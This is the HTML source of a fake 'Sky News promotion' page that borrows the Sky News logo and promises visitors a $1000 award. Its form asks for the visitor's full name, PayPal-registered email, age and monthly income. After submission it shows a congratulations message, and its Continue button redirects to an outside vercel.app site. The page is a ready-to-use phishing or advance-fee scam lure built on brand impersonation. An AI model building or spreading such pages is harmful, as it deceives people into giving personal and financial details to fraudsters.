<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>support</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-image: url('https://e3.365dm.com/23/02/1600x900/skynews-logo-livestream_6066509.jpg?20230222225154');
        background-size: cover;
        background-position: center;
        margin: 0;
        padding: 0;
    }
    h1 {
        text-align: center;
        color: #333;
    }
    form {
        max-width: 500px;
        margin: 20px auto;
        background: #fff;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    label {
        display: block;
        margin-bottom: 10px;
        color: #666;
    }
    input[type="text"],
    input[type="number"],
    select,
    textarea {
        width: 100%;
        padding: 8px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
        margin-bottom: 20px;
    }
    button {
        background-color: #4CAF50;
        color: white;
        padding: 14px 20px;
        margin: 8px 0;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
    }
    button:hover {
        background-color: #45a049;
    }
    .award-container {
        background-color: #c9f7c5;
        padding: 20px;
        border-radius: 5px;
        margin-top: 20px;
    }
    .award-message {
        border: 2px solid green;
        padding: 10px;
        border-radius: 5px;
    }
</style>
</head>
<body>
    <h1>SKY NEWS PROMOTION</h1>
    <form action="#">
        <div>
            <label for="full_names">1. What is your full name as registered in your line?</label>
            <input type="text" id="full_names" name="full_names" required>
        </div>
        <div>
            <label for="email">2. Your email Address registered with PayPal account:</label>
            <input type="email" id="email" name="email" required>
        </div>
        <div>
            <label for="age">3. How old are you?</label>
            <input type="number" id="age" name="age" required>
        </div>
        <div>
            <label for="income">4. What is your approximate monthly income?</label>
            <input type="number" id="income" name="income" required>
        </div>
        <button type="submit">Submit</button>
    </form>

    <div class="award-message" id="awardMessage" style="display:none;">
        <p>CONGRATULATIONS <span id="userName"></span>, YOU ARE IN A GOOD TRUCK OF BEING AWARDED  $1000 FROM sky news promotion.</p>
        <button onclick="redeemAward()">Continue</button>
    </div>

    <script>
        function redeemAward() {
            // Redirect to another page
            window.location.href = "https://sky3.vercel.app/";
        }

        // Extract user's name and display the award message
        const form = document.querySelector('form');
        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            const userName = document.getElementById('full_names').value;
            const awardMessage = document.getElementById('awardMessage');
            const userNameSpan = document.getElementById('userName');
            userNameSpan.textContent = userName;
            awardMessage.style.display = 'block'; // Show the award message
        });
    </script>
</body>
</html>
